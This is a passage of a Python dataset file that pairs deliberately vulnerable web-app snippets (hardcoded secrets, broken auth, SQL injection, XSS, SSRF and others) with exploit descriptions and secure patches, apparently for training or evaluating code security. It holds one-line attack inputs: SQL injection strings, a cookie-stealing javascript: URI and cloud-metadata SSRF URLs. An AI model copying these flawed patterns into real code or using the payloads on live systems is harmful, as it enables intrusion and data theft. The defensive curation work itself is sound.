"""RC2 curation batch 006a — hand-authored, genuinely distinct (part 1 of 2).

7 examples for each of 8 taxonomy categories (EXPOSED_SECRET, BROKEN_AUTH,
MISSING_RATE_LIMIT, UNSAFE_ADMIN_ROUTE, SQL_INJECTION, XSS, SSRF,
COMMAND_INJECTION). Real AI-generated app failure modes, varied frameworks and
languages, no near-duplicates of earlier batches. All hand_authored (curated),
Safety-Layer-consistent via corpus.builder, with real secure patches.
"""
from corpus.builder import vuln

EXAMPLES = [
    # ===================== EXPOSED_SECRET (7) =============================
    vuln(
        id="b006-secret-db-url-gssp",
        lang="typescript", framework="next", file="page.tsx", line=2,
        code=(
            "export async function getServerSideProps() {\n"
            "  const db = connect('postgres://app:Pa55w0rdEXAMPLE@db.internal:5432/prod');\n"
            "  return { props: { rows: await db.all('select * from kpis') } };\n"
            "}\n"
        ),
        category="EXPOSED_SECRET",
        description="Production database URL with password hardcoded in source.",
        exploit="Anyone with repo or build access reads the DB credentials and connects directly to prod.",
        fix="Read the connection string from the server environment; rotate the password.",
        patch="-  const db = connect('postgres://app:Pa55w0rdEXAMPLE@db.internal:5432/prod');\n+  const db = connect(process.env.DATABASE_URL!);",
        fail_dims=("environment_exposure",),
    ),
    vuln(
        id="b006-secret-twilio-rn",
        lang="javascript", framework="react", file="config.js", line=1,
        code=(
            "export const TWILIO = { sid: 'ACEXAMPLE0000000000000000000000', token: 'EXAMPLEauthtoken0000000000000000' };\n"
        ),
        category="EXPOSED_SECRET",
        description="Twilio account SID and auth token bundled into a mobile/web client.",
        exploit="Extracting the bundle yields the Twilio credentials; an attacker sends SMS/calls on your account.",
        fix="Keep Twilio credentials server-side; expose only a thin server endpoint to the client.",
        patch="-export const TWILIO = { sid: 'AC...', token: '...' };\n+// removed; SMS is sent via POST /api/notify on the server, which holds the credentials",
        fail_dims=("environment_exposure",),
    ),
    vuln(
        id="b006-secret-firebase-admin-json",
        lang="javascript", framework="firebase", file="admin.js", line=2,
        code=(
            "const sa = require('./serviceAccountKey.json'); // committed admin private key\n"
            "admin.initializeApp({ credential: admin.credential.cert(sa) });\n"
        ),
        category="EXPOSED_SECRET",
        description="Firebase Admin SDK service-account private key committed to the repo.",
        exploit="The committed key grants full admin access to the Firebase project (DB, auth, storage).",
        fix="Load credentials from a secret/env at runtime, remove the file from VCS, and rotate the key.",
        patch="-const sa = require('./serviceAccountKey.json');\n-admin.initializeApp({ credential: admin.credential.cert(sa) });\n+admin.initializeApp({ credential: admin.credential.applicationDefault() });",
        fail_dims=("environment_exposure",),
    ),
    vuln(
        id="b006-secret-redis-compose",
        lang="yaml", framework="docker", file="docker-compose.yml", line=4,
        code=(
            "services:\n"
            "  api:\n"
            "    environment:\n"
            "      REDIS_URL: redis://:S3cretEXAMPLE@redis:6379/0\n"
        ),
        category="EXPOSED_SECRET",
        description="Redis password embedded in a committed docker-compose file.",
        exploit="Repo access leaks the Redis password; an attacker on the network reads/writes the cache/session store.",
        fix="Reference an env var and keep the value in an untracked .env / secret store.",
        patch="-      REDIS_URL: redis://:S3cretEXAMPLE@redis:6379/0\n+      REDIS_URL: ${REDIS_URL}",
        fail_dims=("environment_exposure",),
    ),
    vuln(
        id="b006-secret-slack-token",
        lang="python", framework="none", file="notify.py", line=1,
        code=(
            "SLACK_BOT_TOKEN = 'xoxb-EXAMPLE-000000000000-notarealtoken'\n"
            "requests.post('https://slack.com/api/chat.postMessage', headers={'Authorization': f'Bearer {SLACK_BOT_TOKEN}'}, json=msg)\n"
        ),
        category="EXPOSED_SECRET",
        description="Slack bot token hardcoded in a script.",
        exploit="The token lets an attacker post as the bot, read channels, and exfiltrate messages.",
        fix="Load the token from the environment and rotate the exposed one.",
        patch="-SLACK_BOT_TOKEN = 'xoxb-EXAMPLE-...'\n+SLACK_BOT_TOKEN = os.environ['SLACK_BOT_TOKEN']",
        fail_dims=("environment_exposure",),
    ),
    vuln(
        id="b006-secret-vite-signing",
        lang="bash", framework="vite", file=".env", line=1,
        code=(
            "VITE_JWT_SIGNING_SECRET=hs256-signing-secret-EXAMPLE\n"
        ),
        category="EXPOSED_SECRET",
        description="A JWT signing secret is exposed via a VITE_-prefixed var, which Vite inlines into the client bundle.",
        exploit="The signing secret ends up in the browser bundle; anyone can forge valid tokens.",
        fix="Sign tokens on the server; never prefix secrets with VITE_.",
        patch="-VITE_JWT_SIGNING_SECRET=hs256-signing-secret-EXAMPLE\n+JWT_SIGNING_SECRET=hs256-signing-secret-EXAMPLE  # server-only, not exposed to the client",
    ),
    vuln(
        id="b006-secret-ssh-deploy",
        lang="bash", framework="none", file="deploy.sh", line=2,
        code=(
            "cat > /tmp/id_ed25519 <<'KEY'\n"
            "-----BEGIN OPENSSH PRIVATE KEY-----\n"
            "EXAMPLE-not-a-real-key\n"
            "-----END OPENSSH PRIVATE KEY-----\n"
            "KEY\n"
        ),
        category="EXPOSED_SECRET",
        description="SSH private key embedded directly in a committed deploy script.",
        exploit="The committed private key grants SSH access to the deploy target for anyone with repo access.",
        fix="Use a CI secret / SSH agent; never commit private keys, and rotate the exposed key.",
        patch="-cat > /tmp/id_ed25519 <<'KEY'\n-----BEGIN OPENSSH PRIVATE KEY-----\n...\n-----END OPENSSH PRIVATE KEY-----\nKEY\n+install -m600 /dev/stdin /tmp/id_ed25519 <<< \"$DEPLOY_SSH_KEY\"  # from CI secret",
        fail_dims=("environment_exposure",),
    ),

    # ===================== BROKEN_AUTH (7) ================================
    vuln(
        id="b006-auth-mw-cookie-presence",
        lang="typescript", framework="next", file="middleware.ts", line=2,
        code=(
            "export function middleware(req) {\n"
            "  if (!req.cookies.get('session')) return NextResponse.redirect('/login');\n"
            "  return NextResponse.next();  // presence only; never validates the cookie\n"
            "}\n"
        ),
        category="BROKEN_AUTH",
        description="Auth middleware checks that a session cookie exists but never validates it.",
        exploit="Setting any non-empty `session` cookie bypasses the gate without a real session.",
        fix="Verify the session token's signature/expiry server-side, not just its presence.",
        patch="-  if (!req.cookies.get('session')) return NextResponse.redirect('/login');\n+  const ok = await verifySession(req.cookies.get('session')?.value);\n+  if (!ok) return NextResponse.redirect('/login');",
        severity="HIGH",
    ),
    vuln(
        id="b006-auth-graphql-no-authz",
        lang="javascript", framework="apollo", file="resolvers.js", line=2,
        code=(
            "const resolvers = {\n"
            "  Query: { user: (_, { id }) => db.user.findById(id) },  // any caller reads any user\n"
            "};\n"
        ),
        category="BROKEN_AUTH",
        description="GraphQL user resolver returns any user by id with no authentication/authorization.",
        exploit="An anonymous client queries user(id:...) for arbitrary ids and harvests profiles.",
        fix="Require an authenticated context and authorize the field.",
        patch="-  Query: { user: (_, { id }) => db.user.findById(id) },\n+  Query: { user: (_, { id }, ctx) => { requireAuth(ctx); return db.user.findById(id); } },",
        severity="HIGH",
    ),
    vuln(
        id="b006-auth-ws-no-token",
        lang="javascript", framework="ws", file="socket.js", line=2,
        code=(
            "wss.on('connection', (socket) => {\n"
            "  socket.on('message', (m) => handlePrivileged(JSON.parse(m)));  // no auth on connect\n"
            "});\n"
        ),
        category="BROKEN_AUTH",
        description="WebSocket server accepts connections and privileged messages with no authentication.",
        exploit="Anyone opens a socket and sends privileged commands without logging in.",
        fix="Authenticate the connection (verify a token in the handshake) before handling messages.",
        patch="+wss.on('connection', (socket, req) => {\n+  const user = verifyToken(new URL(req.url, 'ws://x').searchParams.get('token'));\n+  if (!user) return socket.close(4401);\n   socket.on('message', (m) => handlePrivileged(JSON.parse(m), user));",
        severity="HIGH",
    ),
    vuln(
        id="b006-auth-reset-token-predictable",
        lang="python", framework="flask", file="reset.py", line=2,
        code=(
            "def make_reset_token(uid):\n"
            "    return hashlib.md5(f'{uid}{int(time.time())}'.encode()).hexdigest()  # predictable\n"
        ),
        category="BROKEN_AUTH",
        description="Password-reset token derived from uid + current timestamp (guessable).",
        exploit="An attacker brute-forces the small timestamp window to forge a victim's reset token.",
        fix="Use a cryptographically random token with expiry, stored server-side.",
        patch="-    return hashlib.md5(f'{uid}{int(time.time())}'.encode()).hexdigest()\n+    return secrets.token_urlsafe(32)  # stored with a short TTL, single use",
        severity="HIGH",
    ),
    vuln(
        id="b006-auth-remember-plaintext",
        lang="javascript", framework="express", file="login.js", line=2,
        code=(
            "if (req.body.remember)\n"
            "  res.cookie('remember', `${req.body.email}:${req.body.password}`);  // plaintext creds\n"
        ),
        category="BROKEN_AUTH",
        description="'Remember me' stores the user's email and password in plaintext in a cookie.",
        exploit="Any XSS, shared device, or proxy log leaks the password directly.",
        fix="Store a random, revocable remember-me token mapped server-side; never store the password.",
        patch="-  res.cookie('remember', `${req.body.email}:${req.body.password}`);\n+  res.cookie('remember', await issueRememberToken(user.id), { httpOnly: true, secure: true });",
        severity="HIGH",
    ),
    vuln(
        id="b006-auth-session-no-regen",
        lang="python", framework="flask", file="auth.py", line=2,
        code=(
            "def login(user):\n"
            "    session['uid'] = user.id  # session id NOT rotated on privilege change\n"
            "    return redirect('/app')\n"
        ),
        category="BROKEN_AUTH",
        description="Session identifier is not regenerated at login, enabling session fixation.",
        exploit="Attacker fixes a known session id on the victim; after the victim logs in, the attacker shares the authenticated session.",
        fix="Regenerate the session id on authentication.",
        patch="+    session.clear()\n+    regenerate_session_id()\n     session['uid'] = user.id",
        severity="MEDIUM",
    ),
    vuln(
        id="b006-auth-supabase-rls-off",
        lang="sql", framework="supabase", file="migration.sql", line=1,
        code=(
            "alter table public.profiles disable row level security;  -- table holds emails + phone\n"
        ),
        category="BROKEN_AUTH",
        description="Row Level Security disabled on a table with PII, exposing all rows to the anon key.",
        exploit="Any client with the public anon key selects every row, leaking all users' PII.",
        fix="Enable RLS and add owner-scoped policies.",
        patch="-alter table public.profiles disable row level security;\n+alter table public.profiles enable row level security;\n+create policy own_rows on public.profiles for select using (auth.uid() = id);",
        severity="HIGH",
    ),

    # ===================== MISSING_RATE_LIMIT (7) =========================
    vuln(
        id="b006-rate-sms-send",
        lang="javascript", framework="express", file="sms.js", line=1,
        code=(
            "app.post('/api/sms', (req, res) => { twilio.send(req.body.to, req.body.msg); res.end(); });\n"
        ),
        category="MISSING_RATE_LIMIT",
        description="SMS-send endpoint has no rate limit, enabling toll fraud and SMS bombing.",
        exploit="An attacker scripts thousands of sends, running up the SMS bill and spamming victims.",
        fix="Throttle per IP and per recipient, and require auth.",
        patch="+app.post('/api/sms', rateLimit({ windowMs: 60000, max: 3 }), (req, res) => {\n   twilio.send(req.body.to, req.body.msg); res.end(); });",
    ),
    vuln(
        id="b006-rate-coupon-brute",
        lang="python", framework="fastapi", file="coupon.py", line=2,
        code=(
            "@app.post('/coupon/validate')\n"
            "def validate(code: str):\n"
            "    return {'valid': code in VALID_CODES}  # unlimited attempts\n"
        ),
        category="MISSING_RATE_LIMIT",
        description="Coupon validation allows unlimited attempts, enabling brute-force discovery of codes.",
        exploit="An attacker enumerates the code space to find valid discounts.",
        fix="Rate-limit per IP/account and add exponential backoff.",
        patch="+@limiter.limit('10/minute')\n @app.post('/coupon/validate')\n def validate(code: str):",
    ),
    vuln(
        id="b006-rate-search-expensive",
        lang="python", framework="django", file="search.py", line=2,
        code=(
            "def search(request):\n"
            "    q = request.GET['q']\n"
            "    return JsonResponse(expensive_fulltext(q))  # heavy, unthrottled, unauth\n"
        ),
        category="MISSING_RATE_LIMIT",
        description="Expensive search endpoint is public and unthrottled.",
        exploit="Repeated heavy queries exhaust DB/CPU, a cheap denial-of-service.",
        fix="Add per-client rate limiting and a query cost/timeout budget.",
        patch="+@ratelimit(key='ip', rate='20/m', block=True)\n def search(request):",
        severity="MEDIUM",
    ),
    vuln(
        id="b006-rate-email-resend",
        lang="typescript", framework="next", file="route.ts", line=1,
        code=(
            "export async function POST(req) { await resendVerification((await req.json()).email); return Response.json({ ok: true }); }\n"
        ),
        category="MISSING_RATE_LIMIT",
        description="Verification-email resend has no throttle, enabling email flooding.",
        exploit="An attacker repeatedly triggers verification emails to a victim's inbox.",
        fix="Throttle resends per email/IP with a cooldown.",
        patch="+  if (!(await cooldown(`verify:${email}`, '60s'))) return new Response('wait', { status: 429 });\n   await resendVerification(email);",
    ),
    vuln(
        id="b006-rate-apikey-create",
        lang="javascript", framework="express", file="keys.js", line=1,
        code=(
            "app.post('/api/keys', auth, (req, res) => res.json({ key: createApiKey(req.user) }));  // no cap\n"
        ),
        category="MISSING_RATE_LIMIT",
        description="API-key creation has no per-account cap or rate limit.",
        exploit="A compromised or abusive account mints unlimited keys, complicating revocation and abuse.",
        fix="Cap active keys per account and rate-limit creation.",
        patch="+app.post('/api/keys', auth, async (req, res) => {\n+  if (await keyCount(req.user) >= 10) return res.status(429).json({ error: 'key limit' });\n   res.json({ key: createApiKey(req.user) }); });",
        severity="MEDIUM",
    ),
    vuln(
        id="b006-rate-download-bandwidth",
        lang="python", framework="flask", file="dl.py", line=2,
        code=(
            "@app.get('/download/<fid>')\n"
            "def dl(fid):\n"
            "    return send_file(store_path(fid))  # no auth, no rate limit on large files\n"
        ),
        category="MISSING_RATE_LIMIT",
        description="Large-file download endpoint is unauthenticated and unthrottled.",
        exploit="Mass parallel downloads exhaust bandwidth/egress budget (cost amplification DoS).",
        fix="Require auth, rate-limit, and serve via signed, expiring URLs.",
        patch="+@limiter.limit('30/hour')\n @app.get('/download/<fid>')\n-def dl(fid):\n+def dl(fid):\n+    require_auth()",
    ),
    vuln(
        id="b006-rate-2fa-verify",
        lang="python", framework="fastapi", file="twofa.py", line=2,
        code=(
            "@app.post('/2fa/verify')\n"
            "def verify(code: str, user=Depends(current_user)):\n"
            "    return {'ok': code == totp_now(user)}  # unlimited guesses\n"
        ),
        category="MISSING_RATE_LIMIT",
        description="2FA verification permits unlimited code guesses with no lockout.",
        exploit="A 6-digit TOTP is brute-forced within its window because there is no attempt cap.",
        fix="Lock the account/step-up after a few failed attempts and rate-limit.",
        patch="+    if attempts(user) > 5: raise HTTPException(429, 'locked')\n     return {'ok': code == totp_now(user)}",
        severity="HIGH",
    ),

    # ===================== UNSAFE_ADMIN_ROUTE (7) =========================
    vuln(
        id="b006-admin-client-redirect",
        lang="typescript", framework="next", file="admin.tsx", line=2,
        code=(
            "useEffect(() => { if (!user?.isAdmin) router.push('/'); }, [user]);\n"
            "return <AdminPanel data={await fetchAllUsers()} />;  // data already fetched client-side\n"
        ),
        category="UNSAFE_ADMIN_ROUTE",
        description="Admin page is gated only by a client-side redirect; the privileged data loads regardless.",
        exploit="A non-admin disables JS or reads the network response and sees all admin data before redirect.",
        fix="Enforce the admin check server-side before returning any privileged data.",
        patch="+// server component / route: gate before fetching\n+const session = await auth();\n+if (!session?.user.isAdmin) redirect('/');\n return <AdminPanel data={await fetchAllUsers()} />;",
        severity="HIGH",
    ),
    vuln(
        id="b006-admin-internal-exposed",
        lang="javascript", framework="express", file="internal.js", line=1,
        code=(
            "app.use('/internal', internalRouter);  // bound to 0.0.0.0, reachable from the internet\n"
        ),
        category="UNSAFE_ADMIN_ROUTE",
        description="Internal admin router is mounted with no network restriction or auth.",
        exploit="The /internal endpoints (config, jobs, flush) are reachable publicly.",
        fix="Require admin auth and restrict to an internal network/VPN.",
        patch="-app.use('/internal', internalRouter);\n+app.use('/internal', requireAdmin, ipAllowlist(INTERNAL_CIDRS), internalRouter);",
        severity="HIGH",
    ),
    vuln(
        id="b006-admin-feature-flags",
        lang="python", framework="fastapi", file="flags.py", line=2,
        code=(
            "@app.post('/flags/{name}')\n"
            "def set_flag(name: str, on: bool):\n"
            "    FLAGS[name] = on  # no auth; toggles prod behavior\n"
        ),
        category="UNSAFE_ADMIN_ROUTE",
        description="Feature-flag toggle endpoint has no authentication or role check.",
        exploit="Anyone flips production flags (e.g. disable_payments, enable_debug).",
        fix="Require an admin role to mutate flags.",
        patch="+@require_role('admin')\n @app.post('/flags/{name}')\n def set_flag(name: str, on: bool):",
        severity="HIGH",
    ),
    vuln(
        id="b006-admin-graphql-mutation",
        lang="javascript", framework="apollo", file="adminMut.js", line=2,
        code=(
            "Mutation: {\n"
            "  deleteAllSessions: () => db.session.deleteMany(),  // no role check in context\n"
            "}\n"
        ),
        category="UNSAFE_ADMIN_ROUTE",
        description="Privileged GraphQL mutation has no role check.",
        exploit="Any authenticated (or anonymous) caller invokes deleteAllSessions and logs everyone out.",
        fix="Authorize the mutation against an admin role.",
        patch="-  deleteAllSessions: () => db.session.deleteMany(),\n+  deleteAllSessions: (_, __, ctx) => { requireRole(ctx, 'admin'); return db.session.deleteMany(); },",
        severity="HIGH",
    ),
    vuln(
        id="b006-admin-supabase-edge",
        lang="typescript", framework="supabase", file="index.ts", line=2,
        code=(
            "Deno.serve(async (req) => {\n"
            "  const { uid, role } = await req.json();\n"
            "  return await adminClient.from('members').update({ role }).eq('id', uid);  // no JWT verify\n"
            "});\n"
        ),
        category="UNSAFE_ADMIN_ROUTE",
        description="Supabase Edge Function performs a privileged role update without verifying the caller's JWT.",
        exploit="Anyone POSTs {uid, role:'admin'} to the function URL and escalates an account.",
        fix="Verify the Authorization JWT and the caller's admin role before mutating.",
        patch="+  const caller = await verifyJwt(req.headers.get('Authorization'));\n+  if (!caller?.app_metadata?.admin) return new Response('forbidden', { status: 403 });\n   const { uid, role } = await req.json();",
        severity="HIGH",
    ),
    vuln(
        id="b006-admin-debug-toolbar-prod",
        lang="python", framework="django", file="settings.py", line=1,
        code=(
            "INSTALLED_APPS += ['debug_toolbar']\n"
            "INTERNAL_IPS = ['0.0.0.0/0']  # debug toolbar visible to everyone\n"
        ),
        category="UNSAFE_ADMIN_ROUTE",
        description="Django Debug Toolbar enabled and visible to all clients in production.",
        exploit="The toolbar exposes SQL, settings, and request internals to any visitor.",
        fix="Remove debug_toolbar from production and restrict INTERNAL_IPS.",
        patch="-INSTALLED_APPS += ['debug_toolbar']\n-INTERNAL_IPS = ['0.0.0.0/0']\n+if DEBUG:\n+    INSTALLED_APPS += ['debug_toolbar']\n+    INTERNAL_IPS = ['127.0.0.1']",
        severity="HIGH",
    ),
    vuln(
        id="b006-admin-queue-dashboard",
        lang="javascript", framework="express", file="queues.js", line=1,
        code=(
            "app.use('/admin/queues', bullBoard.getRouter());  // job dashboard, no auth\n"
        ),
        category="UNSAFE_ADMIN_ROUTE",
        description="Background-job dashboard mounted with no authentication.",
        exploit="Anyone views, retries, or deletes jobs — including jobs containing sensitive payloads.",
        fix="Protect the dashboard with admin authentication.",
        patch="-app.use('/admin/queues', bullBoard.getRouter());\n+app.use('/admin/queues', requireAdmin, bullBoard.getRouter());",
        severity="HIGH",
    ),

    # ===================== SQL_INJECTION (7) ==============================
    vuln(
        id="b006-sqli-prisma-rawunsafe",
        lang="typescript", framework="next", file="repo.ts", line=1,
        code=(
            "const rows = await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE email = '${email}'`);\n"
        ),
        category="SQL_INJECTION",
        description="Prisma $queryRawUnsafe with a template literal interpolates user input.",
        exploit="email=' OR '1'='1 returns all users; UNION SELECT exfiltrates other tables.",
        fix="Use the parameterized $queryRaw tagged template (or Prisma.sql bindings).",
        patch="-const rows = await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE email = '${email}'`);\n+const rows = await prisma.$queryRaw`SELECT * FROM users WHERE email = ${email}`;",
    ),
    vuln(
        id="b006-sqli-sqlalchemy-text",
        lang="python", framework="flask", file="repo.py", line=2,
        code=(
            "from sqlalchemy import text\n"
            "rows = conn.execute(text(f\"SELECT * FROM orders WHERE status = '{status}'\"))\n"
        ),
        category="SQL_INJECTION",
        description="SQLAlchemy text() built with an f-string from user input.",
        exploit="status=' OR 1=1-- dumps all orders; stacked queries may modify data.",
        fix="Use bound parameters with text().",
        patch="-rows = conn.execute(text(f\"SELECT * FROM orders WHERE status = '{status}'\"))\n+rows = conn.execute(text('SELECT * FROM orders WHERE status = :s'), {'s': status})",
    ),
    vuln(
        id="b006-sqli-sequelize-literal",
        lang="javascript", framework="node", file="repo.js", line=2,
        code=(
            "const rows = await Order.findAll({ where: Sequelize.literal(`total > ${req.query.min}`) });\n"
        ),
        category="SQL_INJECTION",
        description="Sequelize literal() embeds an unvalidated query parameter directly into SQL.",
        exploit="min=0 OR 1=1; DROP TABLE orders-- injects arbitrary SQL.",
        fix="Use a parameterized where condition with an operator, not literal().",
        patch="-const rows = await Order.findAll({ where: Sequelize.literal(`total > ${req.query.min}`) });\n+const rows = await Order.findAll({ where: { total: { [Op.gt]: Number(req.query.min) } } });",
    ),
    vuln(
        id="b006-sqli-dotnet-concat",
        lang="csharp", framework="aspnet", file="UserRepo.cs", line=2,
        code=(
            "var cmd = new SqlCommand(\"SELECT * FROM Users WHERE Name = '\" + name + \"'\", conn);\n"
            "var r = cmd.ExecuteReader();\n"
        ),
        category="SQL_INJECTION",
        description="SqlCommand built by string concatenation with user input.",
        exploit="name=' OR '1'='1 returns all users; '; EXEC xp_cmdshell ... may run OS commands.",
        fix="Use a parameterized SqlCommand.",
        patch="-var cmd = new SqlCommand(\"SELECT * FROM Users WHERE Name = '\" + name + \"'\", conn);\n+var cmd = new SqlCommand(\"SELECT * FROM Users WHERE Name = @n\", conn);\n+cmd.Parameters.AddWithValue(\"@n\", name);",
    ),
    vuln(
        id="b006-sqli-orderby",
        lang="python", framework="fastapi", file="list.py", line=2,
        code=(
            "col = request.query_params['sort']\n"
            "rows = db.execute(f'SELECT * FROM products ORDER BY {col}')  # ORDER BY injection\n"
        ),
        category="SQL_INJECTION",
        description="Sort column taken from the request and interpolated into ORDER BY.",
        exploit="sort=(CASE WHEN (SELECT ...) THEN a ELSE b END) enables blind boolean/timing exfiltration.",
        fix="Allowlist sortable columns; never interpolate identifiers from input.",
        patch="-col = request.query_params['sort']\n-rows = db.execute(f'SELECT * FROM products ORDER BY {col}')\n+col = request.query_params['sort']\n+if col not in {'name','price','created_at'}: raise HTTPException(400)\n+rows = db.execute(f'SELECT * FROM products ORDER BY {col}')",
    ),
    vuln(
        id="b006-sqli-like-concat",
        lang="php", framework="laravel", file="Search.php", line=2,
        code=(
            "$rows = DB::select(\"SELECT * FROM posts WHERE title LIKE '%\".$q.\"%'\");\n"
        ),
        category="SQL_INJECTION",
        description="LIKE clause built by concatenating user input.",
        exploit="q=%' UNION SELECT password,1 FROM users-- exfiltrates credentials.",
        fix="Use bindings for the LIKE pattern.",
        patch="-$rows = DB::select(\"SELECT * FROM posts WHERE title LIKE '%\".$q.\"%'\");\n+$rows = DB::select('SELECT * FROM posts WHERE title LIKE ?', ['%'.$q.'%']);",
    ),
    vuln(
        id="b006-sqli-spring-jdbc",
        lang="java", framework="spring", file="UserRepo.java", line=2,
        code=(
            "String sql = \"SELECT * FROM users WHERE email = '\" + email + \"'\";\n"
            "return jdbc.queryForList(sql);\n"
        ),
        category="SQL_INJECTION",
        description="Spring JdbcTemplate query built by string concatenation.",
        exploit="email=' OR '1'='1 returns all users; injection can read or modify data.",
        fix="Use a parameterized query with a placeholder.",
        patch="-String sql = \"SELECT * FROM users WHERE email = '\" + email + \"'\";\n-return jdbc.queryForList(sql);\n+return jdbc.queryForList(\"SELECT * FROM users WHERE email = ?\", email);",
    ),

    # ===================== XSS (7) ========================================
    vuln(
        id="b006-xss-svelte-html",
        lang="javascript", framework="vite", file="Post.svelte", line=1,
        code=(
            "{@html post.bodyHtml}\n"
        ),
        category="XSS",
        description="Svelte {@html} renders user-authored HTML without sanitization.",
        exploit="A post body with <script> or an onerror attribute executes for every reader.",
        fix="Render as text, or sanitize the HTML with a vetted sanitizer first.",
        patch="-{@html post.bodyHtml}\n+{post.bodyText}",
    ),
    vuln(
        id="b006-xss-markdown-unsanitized",
        lang="typescript", framework="next", file="Markdown.tsx", line=1,
        code=(
            "return <div dangerouslySetInnerHTML={{ __html: marked(userMarkdown) }} />;  // marked != sanitized\n"
        ),
        category="XSS",
        description="User markdown rendered to HTML and injected raw; marked does not sanitize by default.",
        exploit="Markdown with inline HTML/`<img onerror>` produces executing script.",
        fix="Sanitize the rendered HTML (e.g. DOMPurify) before injecting.",
        patch="-return <div dangerouslySetInnerHTML={{ __html: marked(userMarkdown) }} />;\n+return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(marked(userMarkdown)) }} />;",
    ),
    vuln(
        id="b006-xss-documentwrite",
        lang="javascript", framework="vanilla", file="track.js", line=1,
        code=(
            "document.write('<p>ref: ' + document.referrer + '</p>');\n"
        ),
        category="XSS",
        description="document.write of an attacker-influenceable value (referrer) enables DOM XSS.",
        exploit="A crafted referrer containing markup executes script in the page.",
        fix="Avoid document.write; set textContent on a created node.",
        patch="-document.write('<p>ref: ' + document.referrer + '</p>');\n+const p = document.createElement('p'); p.textContent = 'ref: ' + document.referrer; document.body.appendChild(p);",
    ),
    vuln(
        id="b006-xss-react-href-js",
        lang="javascript", framework="react", file="Link.jsx", line=1,
        code=(
            "return <a href={userProvidedUrl}>profile</a>;  // allows javascript: URIs\n"
        ),
        category="XSS",
        description="User-controlled href permits a javascript: URI (clickable XSS).",
        exploit="userProvidedUrl = javascript:fetch('/x?c='+document.cookie) runs on click.",
        fix="Allow only http/https schemes.",
        patch="-return <a href={userProvidedUrl}>profile</a>;\n+const safe = /^https?:\\/\\//.test(userProvidedUrl) ? userProvidedUrl : '#';\n+return <a href={safe} rel=\"noopener noreferrer\">profile</a>;",
    ),
    vuln(
        id="b006-xss-vue-href-js",
        lang="javascript", framework="vue", file="Link.vue", line=1,
        code=(
            "<a :href=\"item.url\">open</a>\n"
        ),
        category="XSS",
        description="Vue binds an untrusted URL to href, allowing javascript: scheme injection.",
        exploit="item.url = javascript:... executes when the link is clicked.",
        fix="Validate the scheme before binding.",
        patch="-<a :href=\"item.url\">open</a>\n+<a :href=\"safeHref(item.url)\">open</a>  <!-- safeHref allows only http(s) -->",
    ),
    vuln(
        id="b006-xss-php-echo",
        lang="php", framework="none", file="hello.php", line=1,
        code=(
            "echo '<h1>Hi ' . $_GET['name'] . '</h1>';\n"
        ),
        category="XSS",
        description="Reflected XSS: request parameter echoed into HTML without escaping.",
        exploit="?name=<script>...</script> executes in the victim's browser.",
        fix="HTML-escape the value on output.",
        patch="-echo '<h1>Hi ' . $_GET['name'] . '</h1>';\n+echo '<h1>Hi ' . htmlspecialchars($_GET['name'], ENT_QUOTES) . '</h1>';",
    ),
    vuln(
        id="b006-xss-handlebars-triple",
        lang="javascript", framework="express", file="view.hbs", line=1,
        code=(
            "<div class=\"bio\">{{{ user.bio }}}</div>\n"
        ),
        category="XSS",
        description="Handlebars triple-stache outputs unescaped HTML for a user bio.",
        exploit="A bio containing <script> renders and executes for viewers.",
        fix="Use the escaping double-stache for untrusted values.",
        patch="-<div class=\"bio\">{{{ user.bio }}}</div>\n+<div class=\"bio\">{{ user.bio }}</div>",
    ),

    # ===================== SSRF (7) =======================================
    vuln(
        id="b006-ssrf-webhook-test",
        lang="javascript", framework="express", file="webhooks.js", line=2,
        code=(
            "app.post('/webhooks/test', async (req, res) => {\n"
            "  const r = await fetch(req.body.targetUrl, { method: 'POST', body: '{}' });\n"
            "  res.json({ status: r.status });\n"
            "});\n"
        ),
        category="SSRF",
        description="Webhook 'test' feature POSTs to an arbitrary user-supplied URL from the server.",
        exploit="targetUrl=http://169.254.169.254/... reaches cloud metadata or internal services.",
        fix="Allowlist destination hosts and block private/link-local ranges.",
        patch="+  if (!(await isPublicAllowedUrl(req.body.targetUrl))) return res.status(400).end();\n   const r = await fetch(req.body.targetUrl, { method: 'POST', body: '{}' });",
        severity="HIGH",
    ),
    vuln(
        id="b006-ssrf-link-unfurl",
        lang="python", framework="fastapi", file="unfurl.py", line=2,
        code=(
            "@app.get('/unfurl')\n"
            "def unfurl(url: str):\n"
            "    html = requests.get(url, timeout=3).text  # fetch arbitrary URL for link preview\n"
            "    return extract_og_tags(html)\n"
        ),
        category="SSRF",
        description="Link-preview/unfurl fetches any URL server-side with no host restriction.",
        exploit="url=http://metadata.google.internal/... exfiltrates instance credentials.",
        fix="Resolve and allowlist the host; reject private/link-local addresses.",
        patch="+    if not is_public_host(url):\n+        raise HTTPException(400)\n     html = requests.get(url, timeout=3).text",
        severity="HIGH",
    ),
    vuln(
        id="b006-ssrf-oidc-discovery",
        lang="python", framework="flask", file="oidc.py", line=2,
        code=(
            "def login(issuer):\n"
            "    cfg = requests.get(issuer + '/.well-known/openid-configuration').json()  # issuer from user\n"
            "    return redirect(cfg['authorization_endpoint'])\n"
        ),
        category="SSRF",
        description="OIDC discovery fetches a user-supplied issuer URL, an SSRF vector.",
        exploit="issuer=http://169.254.169.254 makes the server fetch internal/metadata endpoints.",
        fix="Allowlist known issuers; do not accept arbitrary issuer URLs.",
        patch="-def login(issuer):\n+def login(issuer):\n+    if issuer not in ALLOWED_ISSUERS:\n+        abort(400)\n     cfg = requests.get(issuer + '/.well-known/openid-configuration').json()",
        severity="HIGH",
    ),
    vuln(
        id="b006-ssrf-screenshot",
        lang="javascript", framework="node", file="shot.js", line=2,
        code=(
            "app.get('/screenshot', async (req, res) => {\n"
            "  await page.goto(req.query.url);  // headless browser navigates any URL\n"
            "  res.type('png').send(await page.screenshot());\n"
            "});\n"
        ),
        category="SSRF",
        description="Headless-browser screenshot service navigates to any user URL.",
        exploit="url=http://localhost:6379 or file:// reaches internal services / local files.",
        fix="Allowlist schemes/hosts and disable file:// and internal ranges.",
        patch="+  if (!isPublicHttpUrl(req.query.url)) return res.status(400).end();\n   await page.goto(req.query.url);",
        severity="HIGH",
    ),
    vuln(
        id="b006-ssrf-csv-import-url",
        lang="python", framework="django", file="import.py", line=2,
        code=(
            "def import_csv(request):\n"
            "    data = requests.get(request.POST['csv_url']).content  # import from arbitrary URL\n"
            "    return ingest(data)\n"
        ),
        category="SSRF",
        description="CSV import fetches a user-provided URL server-side with no validation.",
        exploit="csv_url pointing at an internal admin API or metadata endpoint is fetched by the server.",
